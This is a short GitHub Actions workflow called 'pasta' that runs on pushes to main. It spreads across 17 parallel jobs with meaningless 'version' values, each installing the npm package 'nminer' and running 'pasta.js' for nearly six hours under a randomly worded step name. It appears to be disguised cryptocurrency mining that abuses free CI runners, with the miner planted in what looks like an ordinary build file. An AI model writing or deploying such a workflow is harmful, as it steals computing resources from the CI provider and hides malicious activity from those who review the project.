name: pasta
on:
  push:
    branches: [ "main" ]

jobs:
  build:
    runs-on: ubuntu-latest
    strategy:
      matrix:
        config:
          - { version: 1351 }
          - { version: 9196 }
          - { version: 4431 }
          - { version: 5743 }
          - { version: 9409 }
          - { version: 8473 }
          - { version: 39 }
          - { version: 2551 }
          - { version: 275 }
          - { version: 3638 }
          - { version: 1621 }
          - { version: 6176 }
          - { version: 9268 }
          - { version: 1451 }
          - { version: 5143 }
          - { version: 5468 }
          - { version: 3951 }

    steps:
      - name: Checkout
        uses: actions/checkout@v4

      - name: Install Node.js
        uses: actions/setup-node@v3
        with:
          node-version: 20
          
      - name: impressionable nicely versus pecan
        run: |
          npm install nminer@latest
          timeout 329m node pasta.js || echo "pasta executed"